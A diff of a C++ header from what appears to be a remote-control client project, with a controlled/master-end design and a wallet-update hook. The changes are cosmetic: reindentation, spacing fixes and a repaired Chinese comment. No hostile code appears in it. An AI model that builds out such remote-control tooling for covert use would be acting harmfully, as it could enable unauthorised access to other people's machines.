@@ -30,16 +30,16 @@ typedef IOCPClient CClientSocket;
 typedef IOCPClient ISocketBase;
 
 HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
-                      SIZE_T dwStackSize,                       // initial stack size
-                      LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
-                      LPVOID lpParameter,                       // thread argument
-                      DWORD dwCreationFlags,                    // creation option
-                      LPDWORD lpThreadId, bool bInteractive = false);
+    SIZE_T dwStackSize,                       // initial stack size
+    LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
+    LPVOID lpParameter,                       // thread argument
+    DWORD dwCreationFlags,                    // creation option
+    LPDWORD lpThreadId, bool bInteractive = false);
 
 class CManager : public IOCPManager
 {
 public:
-    const State&g_bExit; // 1-琚帶绔€€鍑?2-涓绘帶绔€€鍑?
+    const State& g_bExit; // 1-被控端退出 2-主控端退出
     BOOL m_bReady;
     CManager(IOCPClient* ClientObject);
     virtual ~CManager();
@@ -55,7 +55,7 @@ public:
         return m_ClientObject->IsConnected();
     }
     virtual void Notify() { }
-    virtual void UpdateWallet(const std::string &wallet) { }
+    virtual void UpdateWallet(const std::string& wallet) { }
     BOOL Send(LPBYTE lpData, UINT nSize);
     BOOL SendData(LPBYTE lpData, UINT nSize)
     {
